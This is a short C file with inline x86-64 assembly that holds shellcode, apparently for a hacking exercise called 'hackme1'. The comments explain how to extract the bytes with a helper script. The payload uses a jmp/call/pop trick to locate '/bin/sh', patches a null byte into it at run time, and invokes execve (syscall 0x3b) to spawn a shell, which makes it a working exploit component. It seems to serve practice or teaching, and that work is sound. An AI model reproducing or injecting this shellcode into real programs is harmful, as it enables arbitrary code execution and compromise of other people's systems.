int main(void)
//put shellcode instructions in the __asm___() part, then run ./makeshellcode script
//will only take the code up until ret, so be careful if you use ret yourself
//this contains the shellcode for hackme1
{
  __asm__ (
    "jmp j2;"
    "j1: jmp start;"
    "j2: call j1;" //put the address of the string /bin/sh on the stack
    ".ascii \"/bin/shX\";"
    "start: pop %rdi;" //take the address of the string /bin/sh from the stack
    "xor %rax, %rax;" //set RAX to zero
    "movb %al, 7(%rdi);" //set a nullbyte after the /bin/sh in the written file
    "mov $0x3b, %al;" //put the syscall number in rax    
    "xor %rsi,%rsi;" //RSI must be set to zero
    "xor %rdx,%rdx;" //RDX must be set to zero    
    "syscall;"
    
  );
  return 0;
}
